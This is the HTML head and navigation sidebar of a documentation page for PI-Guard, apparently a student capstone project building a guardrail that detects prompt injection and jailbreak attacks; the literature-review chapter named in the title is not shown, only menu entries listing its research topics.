@@ -1,0 +1,3572 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A Machine-Learning Guardrail for Detecting Prompt Injection and Jailbreak Attacks on LLM Applications">
+      
+      
+        <meta name="author" content="PI-Guard Capstone Team (FPT University)">
+      
+      
+        <link rel="canonical" href="https://nvtruongops.github.io/pi-guard/thesis/chapter_02_literature_review/">
+      
+      
+        <link rel="prev" href="../chapter_01_introduction/">
+      
+      
+        <link rel="next" href="../final_thesis/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Chương 2: Tổng Quan Tài Liệu (Literature Review) - PI-Guard: LLM Security Guardrail</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#chapter-2-literature-review" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PI-Guard: LLM Security Guardrail" class="md-header__button md-logo" aria-label="PI-Guard: LLM Security Guardrail" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PI-Guard: LLM Security Guardrail
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Chương 2: Tổng Quan Tài Liệu (Literature Review)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="Chuyển sang Dark Mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Chuyển sang Dark Mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="purple"  aria-label="Chuyển sang Light Mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Chuyển sang Light Mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/nvtruongops/pi-guard" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    nvtruongops/pi-guard
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PI-Guard: LLM Security Guardrail" class="md-nav__button md-logo" aria-label="PI-Guard: LLM Security Guardrail" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PI-Guard: LLM Security Guardrail
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/nvtruongops/pi-guard" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    nvtruongops/pi-guard
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Trang Chủ
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quản Lý Công Việc & Tiến Độ
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Quản Lý Công Việc & Tiến Độ
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../work/fpt_guidelines_and_rubrics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lộ Trình & Tiêu Chuẩn FPT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Biên Bản Họp Nhóm
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Biên Bản Họp Nhóm
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../work/meeting_1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Biên Bản Họp 1 & Kế Hoạch Sprint 1 (29/08/2026)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../work/meeting_2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Biên Bản Họp 2 & Nghiên Cứu Mô Hình (01/09/2026)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../work/meeting_3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Biên Bản Họp 3 & Chốt Slide Báo Cáo GVHD (08/09/2026)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. Prompt Study (Bản Chất LLM)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    1. Prompt Study (Bản Chất LLM)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../prompt_study/llm_foundations/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nền Tảng LLM & Token Generation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../prompt_study/prompt_structure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cấu Trúc Prompt & Chat Formats
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../prompt_study/instruction_hierarchy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Thất Bại Phân Cấp Chỉ Thị (Instruction Hierarchy)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../prompt_study/resources_and_papers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu, Bài Báo & Video
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Attack Study (Tấn Công)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    2. Attack Study (Tấn Công)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tổng Quan & Ranh Giới Đề Tài
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tổng Quan & Ranh Giới Đề Tài
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../attacks/history_and_evolution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Biên Niên Sử Tiến Hóa (2022-2026)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../attacks/scope_and_boundary_analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phân Tích Ranh Giới In/Out-Scope
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prompt Injection (OWASP LLM01)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Prompt Injection (OWASP LLM01)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../attacks/pi_how_it_works/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bản Chất & Cơ Chế Hoạt Động
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../attacks/pi_taxonomy_and_variants/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phân Loại & Các Biến Thể
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../attacks/pi_resources_and_papers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu, Bài Báo & Video
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Jailbreak Attacks
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Jailbreak Attacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../attacks/jb_archetypes_and_mechanisms/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4 Trường Phái (DAN, Roleplay, VM, Cipher)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../attacks/jb_datasets_and_benchmarks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cơ Sở Dữ Liệu & 10 Họ Chiến Thuật
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../attacks/jb_advanced_variants_and_operators/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Biến Thể Nâng Cao & 26 Toán Tử (Tencent 2026)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../attacks/jb_resources_and_papers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu, Bài Báo & Video
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Threat & Defense (Phòng Thủ Đa Tầng)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    3. Threat & Defense (Phòng Thủ Đa Tầng)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../threat_defense/threat_model_and_attack_surface/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mô Hình Hóa Đe Dọa & Bề Mặt Tấn Công
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../threat_defense/multi_layer_defense_architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kiến Trúc Phòng Thủ 3 Lớp (Defense-in-Depth)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../threat_defense/comparative_matrix_and_tradeoffs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bảng So Sánh & Phân Tích Đánh Đổi
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../threat_defense/resources_and_papers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu Học Thuật, Video & Mã Nguồn Mẫu
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Dataset & Benchmark Study
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    4. Dataset & Benchmark Study
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dataset_study/data_curation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tuyển Chọn Dữ Liệu & Phân Loại 3 Lớp
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dataset_study/group_aware_splitting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phân Chia Group-Aware & Đánh Giá OOD
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dataset_study/resources_and_papers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu, Benchmark & Nguồn Dữ Liệu
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Model Study (Kiến Trúc Hai Tầng)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    5. Model Study (Kiến Trúc Hai Tầng)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../models/two_tier_architecture/" class="md-nav__link">
+        
+  
+  
